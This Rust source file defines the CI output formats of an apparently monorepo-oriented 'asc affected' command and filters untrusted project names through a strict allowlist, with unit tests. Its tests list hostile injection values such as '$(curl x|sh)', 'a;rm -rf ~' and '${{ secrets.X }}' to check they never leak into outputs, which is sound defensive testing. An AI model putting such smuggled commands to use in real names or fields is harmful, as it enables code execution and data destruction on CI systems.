//! Output formats of `asc affected` (SPEC §12A.9): `list`, `json`, `turbo`, `nx`, `matrix` and
//! `gha`. Pure functions of a [`Report`], so the golden tests need no repository.
//!
//! Project names come from untrusted manifests: text formats escape control characters, and
//! the `turbo`, `nx` and `gha` formats never emit a name that could split a filter or inject a
//! line into `$GITHUB_OUTPUT`. Every name, root, workspace and id in a CI output (`turbo`, `nx`,
//! `matrix`, `gha`) must match a strict ASCII allowlist (`[A-Za-z0-9@/._~-]`, no leading `-`);
//! a row with any other value is left out and listed by `invisible_note`. Consumers should still
//! pass these values through environment variables, never `${{ }}` interpolation.

use serde_json::{Value, json};

/// One affected project, with everything the formats need.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Row {
    pub id: String,
    pub ecosystem: &'static str,
    pub name: String,
    pub root: String,
    pub kind: &'static str,
    pub direct: bool,
    pub reasons: Vec<String>,
    pub hash: Option<String>,
    /// A Node Package that is not the repository-root package.
    pub turbo_visible: bool,
    /// Reached from a Node Package through Contains edges.
    pub contained_by_node: bool,
    /// The root of its Workspace or Solution, else its own root.
    pub workspace: String,
    /// The display id of that Workspace or Solution, else its own id.
    pub workspace_id: String,
    /// A Workspace, a Solution or a standalone Package (one `--matrix-by workspace` row).
    pub workspace_head: bool,
}

/// The data of an `affected` run.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Report {
    pub base: String,
    pub head: String,
    pub merge_base: String,
    pub all: bool,
    pub rows: Vec<Row>,
    pub removed: Vec<String>,
    pub unowned: Vec<String>,
    pub issues: Vec<(String, String)>,
}

/// How `--matrix-by` groups rows.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MatrixBy {
    Project,
    Workspace,
    Ecosystem,
}

/// Escapes control characters, so one value is one line.
pub fn clean(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        if c.is_control() {
            out.push_str(&format!("\\x{:02x}", c as u32 & 0xff));
        } else {
            out.push(c);
        }
    }
    out
}

/// `list`: one display id per line, with `--explain` a tab and the reasons.
pub fn list(r: &Report, explain: bool) -> String {
    let mut out = String::new();
    for row in &r.rows {
        out.push_str(&clean(&row.id));
        if explain {
            out.push('\t');
            out.push_str(&clean(&row.reasons.join(",")));
        }
        out.push('\n');
    }
    out
}

/// `json`: the SPEC §12A.9 document.
pub fn json(r: &Report) -> Value {
    let projects: Vec<Value> = r
        .rows
        .iter()
        .map(|p| {
            json!({
                "id": p.id, "ecosystem": p.ecosystem, "name": p.name, "root": p.root,
                "kind": p.kind, "direct": p.direct, "reasons": p.reasons, "hash": p.hash,
            })
        })
        .collect();
    let issues: Vec<Value> = r
        .issues
        .iter()
        .map(|(path, message)| json!({"path": path, "message": message}))
        .collect();
    json!({
        "version": 1, "base": r.base, "head": r.head, "mergeBase": r.merge_base, "all": r.all,
        "projects": projects, "removed": r.removed, "unowned": r.unowned, "issues": issues,
    })
}

/// One name segment: ASCII `[A-Za-z0-9_.~-]`, starting with an alphanumeric or `~` (never `-`).
/// The set is the union of the npm, crates.io, NuGet and PyPI safe sets.
fn segment(s: &str) -> bool {
    let mut cs = s.chars();
    cs.next().is_some_and(|c| c.is_ascii_alphanumeric() || c == '~')
        && cs.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '~' | '-'))
}

/// A name every CI output can carry: `(@scope/)?segment`, at most 214 bytes. Fails closed.
fn plain_name(name: &str) -> bool {
    if name.len() > 214 {
        return false;
    }
    match name.strip_prefix('@') {
        Some(rest) => rest.split_once('/').is_some_and(|(sc, n)| segment(sc) && segment(n)),
        None => segment(name),
    }
}

/// A repository path every CI output can carry: `.`, or `/`-separated safe segments.
fn plain_path(path: &str) -> bool {
    path == "."
        || (path.len() <= 4096 && path.split('/').all(|c| c != ".." && c != "." && segment(c)))
}

/// A display id `<ecosystem>:<rest>`, where `rest` is a name or a path.
fn plain_id(id: &str) -> bool {
    id.split_once(':').is_some_and(|(eco, rest)| {
        !eco.is_empty()
            && eco.chars().all(|c| c.is_ascii_lowercase())
            && (plain_name(rest) || plain_path(rest))
    })
}

/// Every value of the row that a CI output emits passes the allowlist.
fn row_safe(p: &Row) -> bool {
    plain_id(&p.id)
        && plain_name(&p.name)
        && plain_path(&p.root)
        && plain_path(&p.workspace)
        && plain_id(&p.workspace_id)
}

/// The names for `turbo` and `nx`, and the ids that CI output omits or turbo cannot see.
fn visible(r: &Report) -> (Vec<&str>, Vec<&str>) {
    let (mut names, mut hidden) = (Vec::new(), Vec::new());
    for row in &r.rows {
        if !row_safe(row) {
            hidden.push(row.id.as_str());
        } else if row.turbo_visible {
            names.push(row.name.as_str());
        } else if row.ecosystem != "node" && !row.contained_by_node {
            hidden.push(row.id.as_str());
        }
    }
    (names, hidden)
}

/// How many affected rows have a value no CI output may emit. When it is not zero the outputs
/// widen to "run everything", so a hostile rename cannot make CI skip a project.
fn unsafe_count(r: &Report) -> usize {
    r.rows.iter().filter(|p| !row_safe(p)).count()
}

/// The rows CI outputs may emit.
fn safe_rows(r: &Report) -> impl Iterator<Item = &Row> {
    r.rows.iter().filter(|p| row_safe(p))
}

/// The `asc: not visible to turbo: <ids>` line, or empty.
pub fn invisible_note(r: &Report) -> String {
    let (_, hidden) = visible(r);
    if hidden.is_empty() {
        return String::new();
    }
    let ids: Vec<String> = hidden.into_iter().map(clean).collect();
    format!("asc: not visible to turbo: {}\n", ids.join(" "))
}

/// `turbo`: `--filter=<name>` for each affected Node package, space-separated, one line.
pub fn turbo(r: &Report) -> String {
    if unsafe_count(r) > 0 {
        return "--filter=*\n".into();
    }
    let (names, _) = visible(r);
    let filters: Vec<String> = names.iter().map(|n| format!("--filter={n}")).collect();
    format!("{}\n", filters.join(" "))
}

/// `nx`: comma-separated names for `nx run-many --projects=`.
pub fn nx(r: &Report) -> String {
    if unsafe_count(r) > 0 {
        return "*\n".into();
    }
    let (names, _) = visible(r);
    format!("{}\n", names.join(","))
}

/// `matrix`: `{"include":[...]}`. Rows with an unsafe value are left out (see `invisible_note`).
pub fn matrix(r: &Report, by: MatrixBy) -> Value {
    let row = |p: &Row| {
        json!({"project": p.id, "name": p.name, "ecosystem": p.ecosystem, "root": p.root,
               "workspace": p.workspace})
    };
    let include: Vec<Value> = match by {
        MatrixBy::Project => safe_rows(r).map(row).collect(),
        MatrixBy::Workspace => {
            let mut seen = std::collections::BTreeSet::new();
            safe_rows(r)
                .filter(|p| seen.insert((p.ecosystem, p.workspace.clone())))
                .map(|p| {
                    if p.workspace_head {
                        row(p)
                    } else {
                        json!({"project": p.workspace_id, "name": p.workspace_id,
                               "ecosystem": p.ecosystem, "root": p.workspace,
                               "workspace": p.workspace})
                    }
                })
                .collect()
        }
        MatrixBy::Ecosystem => {
            let mut seen = std::collections::BTreeSet::new();
            safe_rows(r)
                .filter(|p| seen.insert(p.ecosystem))
                .map(|p| {
                    json!({"project": p.ecosystem, "name": p.ecosystem,
                           "ecosystem": p.ecosystem, "root": ".", "workspace": "."})
                })
                .collect()
        }
    };
    let mut include = include;
    if unsafe_count(r) > 0 {
        include.push(json!({"project": "all", "name": "all", "ecosystem": "all", "root": ".",
                            "workspace": "."}));
    }
    json!({ "include": include })
}

/// `gha`: lines for `$GITHUB_OUTPUT`.
pub fn gha(r: &Report, by: MatrixBy) -> String {
    let ids: Vec<&str> = safe_rows(r).map(|p| p.id.as_str()).collect();
    let hidden = unsafe_count(r);
    let all = r.all || hidden > 0;
    let has = |eco: &str| all || r.rows.iter().any(|p| p.ecosystem == eco);
    let (names, _) = visible(r);
    let (turbo_filter, nx_projects) = if hidden > 0 {
        ("--filter=*".to_string(), "*".to_string())
    } else {
        (names.iter().map(|n| format!("--filter={n}")).collect::<Vec<_>>().join(" "), names.join(","))
    };
    let mut out = String::new();
    let mut line = |k: &str, v: String| {
        out.push_str(k);
        out.push('=');
        out.push_str(&v);
        out.push('\n');
    };
    line("affected", Value::from(ids).to_string());
    line("count", r.rows.len().to_string());
    line("all", all.to_string());
    line("hidden", hidden.to_string());
    for eco in ["rust", "python", "dotnet", "node"] {
        line(eco, has(eco).to_string());
    }
    line("turbo_filter", turbo_filter);
    line("nx_projects", nx_projects);
    line("matrix", matrix(r, by).to_string());
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn row(eco: &'static str, name: &str, root: &str) -> Row {
        Row {
            id: format!("{eco}:{name}"),
            ecosystem: eco,
            name: name.into(),
            root: root.into(),
            kind: "package",
            direct: true,
            reasons: vec!["file:a".into(), "new".into()],
            hash: None,
            turbo_visible: eco == "node" && root != ".",
            contained_by_node: false,
            workspace: root.into(),
            workspace_id: format!("{eco}:{name}"),
            workspace_head: true,
        }
    }

    fn report(rows: Vec<Row>) -> Report {
        Report {
            base: "b".into(),
            head: "h".into(),
            merge_base: "m".into(),
            all: false,
            rows,
            removed: vec![],
            unowned: vec!["x.md".into()],
            issues: vec![],
        }
    }

    #[test]
    fn list_and_explain() {
        let r = report(vec![row("node", "a", "pkg/a"), row("rust", "b", "crates/b")]);
        assert_eq!(list(&r, false), "node:a\nrust:b\n");
        assert_eq!(list(&r, true), "node:a\tfile:a,new\nrust:b\tfile:a,new\n");
    }

    #[test]
    fn list_escapes_control_characters() {
        let r = report(vec![row("node", "a\nb", "pkg/a")]);
        assert_eq!(list(&r, false), "node:a\\x0ab\n");
    }

    #[test]
    fn turbo_and_nx_golden() {
        let r = report(vec![row("node", "a", "pkg/a"), row("node", "@s/b", "pkg/b"), row("rust", "c", "c")]);
        assert_eq!(turbo(&r), "--filter=a --filter=@s/b\n");
        assert_eq!(nx(&r), "a,@s/b\n");
        assert_eq!(invisible_note(&r), "asc: not visible to turbo: rust:c\n");
    }

    #[test]
    fn contained_projects_are_visible_through_their_node_parent() {
        let mut c = row("rust", "c", "c");
        c.contained_by_node = true;
        let r = report(vec![row("node", "a", "pkg/a"), c]);
        assert_eq!(invisible_note(&r), "");
    }

    #[test]
    fn names_that_split_filters_widen_to_everything() {
        let r = report(vec![row("node", "a b", "pkg/a"), row("node", "x,y", "pkg/b")]);
        assert_eq!(turbo(&r), "--filter=*\n");
        assert_eq!(invisible_note(&r), "asc: not visible to turbo: node:a b node:x,y\n");
    }

    #[test]
    fn matrix_golden() {
        let r = report(vec![row("node", "a", "pkg/a"), row("rust", "c", "crates/c")]);
        assert_eq!(
            matrix(&r, MatrixBy::Project).to_string(),
            r#"{"include":[{"ecosystem":"node","name":"a","project":"node:a","root":"pkg/a","workspace":"pkg/a"},{"ecosystem":"rust","name":"c","project":"rust:c","root":"crates/c","workspace":"crates/c"}]}"#
        );
        assert_eq!(
            matrix(&r, MatrixBy::Ecosystem).to_string(),
            r#"{"include":[{"ecosystem":"node","name":"node","project":"node","root":".","workspace":"."},{"ecosystem":"rust","name":"rust","project":"rust","root":".","workspace":"."}]}"#
        );
    }

    #[test]
    fn matrix_by_workspace_collapses_members() {
        let mut a = row("node", "a", "pkg/a");
        let mut b = row("node", "b", "pkg/b");
        for p in [&mut a, &mut b] {
            p.workspace = ".".into();
            p.workspace_id = "node:root".into();
            p.workspace_head = false;
        }
        let r = report(vec![a, b]);
        let v = matrix(&r, MatrixBy::Workspace);
        assert_eq!(v["include"].as_array().unwrap().len(), 1);
        assert_eq!(v["include"][0]["project"], "node:root");
    }

    #[test]
    fn gha_golden() {
        let r = report(vec![row("node", "a", "pkg/a")]);
        assert_eq!(
            gha(&r, MatrixBy::Project),
            concat!(
                "affected=[\"node:a\"]\ncount=1\nall=false\nhidden=0\nrust=false\npython=false\n",
                "dotnet=false\nnode=true\nturbo_filter=--filter=a\nnx_projects=a\n",
                "matrix={\"include\":[{\"ecosystem\":\"node\",\"name\":\"a\",\"project\":\"node:a\",",
                "\"root\":\"pkg/a\",\"workspace\":\"pkg/a\"}]}\n"
            )
        );
    }

    #[test]
    fn gha_all_sets_every_ecosystem() {
        let mut r = report(vec![]);
        r.all = true;
        let out = gha(&r, MatrixBy::Project);
        assert!(out.contains("rust=true\npython=true\ndotnet=true\nnode=true\n"));
    }

    #[test]
    fn json_shape() {
        let r = report(vec![row("node", "a", "pkg/a")]);
        let v = json(&r);
        assert_eq!(v["version"], 1);
        assert_eq!(v["mergeBase"], "m");
        assert_eq!(v["projects"][0]["hash"], Value::Null);
        assert_eq!(v["unowned"][0], "x.md");
    }

    const HOSTILE: [&str; 8] = [
        "$(curl x|sh)", "a;rm -rf ~", "a`id`", "a\"b", "a'b", "${{ secrets.X }}", "a%0Ab", "-rf",
    ];

    #[test]
    fn hostile_names_never_reach_ci_outputs() {
        let mut rows = vec![row("node", "@asc/web", "pkg/web"), row("node", "my_pkg.v2", "pkg/v2")];
        for (i, h) in HOSTILE.iter().enumerate() {
            rows.push(row("node", h, &format!("pkg/h{i}")));
        }
        let r = report(rows);
        let out = gha(&r, MatrixBy::Project);
        let mat = matrix(&r, MatrixBy::Project).to_string();
        let all = format!("{out}\n{mat}\n{}\n{}", turbo(&r), nx(&r));
        for h in HOSTILE {
            assert!(!all.contains(h), "{h} leaked");
            assert!(invisible_note(&r).contains(h), "{h} not hidden");
        }
        assert!(out.contains("all=true\nhidden=8\n"));
        assert!(out.contains("turbo_filter=--filter=*\nnx_projects=*\n"));
        let m = matrix(&r, MatrixBy::Project);
        assert_eq!(m["include"].as_array().unwrap().len(), 3);
        assert!(mat.contains("@asc/web") && mat.contains("my_pkg.v2"));
    }

    #[test]
    fn hostile_roots_never_reach_ci_outputs() {
        let r = report(vec![
            row("node", "ok", "pkg/$(id)"),
            row("rust", "fine", "a b/c"),
            row("node", "good", "pkg/good"),
        ]);
        let out = gha(&r, MatrixBy::Project);
        assert!(!out.contains("$(id)") && !out.contains("a b/c"));
        assert!(out.contains("pkg/good"));
        assert!(invisible_note(&r).contains("node:ok"));
        assert!(invisible_note(&r).contains("rust:fine"));
    }

    #[test]
    fn unsafe_row_widens_outputs_to_run_everything() {
        let r = report(vec![row("node", "ok", "pkg/ok"), row("rust", "$(id)", "crates/x")]);
        let out = gha(&r, MatrixBy::Project);
        assert!(out.contains("count=2\nall=true\nhidden=1\nrust=true\n"), "{out}");
        assert!(out.contains("turbo_filter=--filter=*\nnx_projects=*\n"));
        assert!(!out.contains("$(id)"));
        assert_eq!(turbo(&r), "--filter=*\n");
        assert_eq!(nx(&r), "*\n");
        let m = matrix(&r, MatrixBy::Project);
        assert_eq!(m["include"].as_array().unwrap().len(), 2);
        assert_eq!(m["include"][1]["project"], "all");
        assert!(!m.to_string().contains("$(id)"));
    }

    #[test]
    fn name_allowlist_edges() {
        assert!(!plain_name("-x") && !plain_name("@s/") && !plain_name("a/b") && !plain_name("é"));
        assert!(!plain_name(&"a".repeat(215)) && plain_name(&"a".repeat(214)));
    }
}
